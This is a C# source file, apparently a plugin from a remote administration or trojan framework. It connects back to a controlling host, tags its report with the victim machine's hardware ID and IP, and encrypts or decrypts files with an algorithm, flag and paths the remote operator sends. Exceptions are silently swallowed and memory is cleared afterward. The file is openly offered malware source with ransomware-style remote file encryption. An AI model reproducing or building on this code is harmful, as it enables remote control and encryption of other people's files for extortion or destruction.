using Shared;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public class Launch
    {
        public async static Task Main(Host H, string HWID, object[] Param, Socket Base, string key, string BaseIP)
        {
            try
            {
                Socket S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPEndPoint ep = new IPEndPoint(IPAddress.Parse(H.host), H.port);
                S.Connect(ep);
                PacketType T = (PacketType)Param[0];
                Data D = new Data();
                D.HWID = HWID;
                D.IP_Origin = BaseIP;
                switch (T)
                {
                    case PacketType.ENCRYPT_F:
                        //List<string> Drive = await Task.Run(() => Functions.GetDisks());
                        bool hasEncrypt = await Task.Run(() => Functions.RunEncryptionDecryption((Algorithm)Param[1], (bool)Param[2], (string)Param[3], (string)Param[4]));
                        D.Type = PacketType.ENCRYPT_F;
                        D.DataReturn = new object[] { hasEncrypt };
                       // await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;

                    case PacketType.DECRYPT_F:
                        bool hasDecrypt = await Task.Run(() => Functions.RunEncryptionDecryption((Algorithm)Param[1], (bool)Param[2], (string)Param[3], (string)Param[4]));
                        D.Type = PacketType.DECRYPT_F;
                        D.DataReturn = new object[] { hasDecrypt };
                        //await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;
                }
                S.Close();
                S.Dispose();
            }
            catch {}
            finally
            {
                Shared.Utils.ClearMem();
            }
        }
    }
}
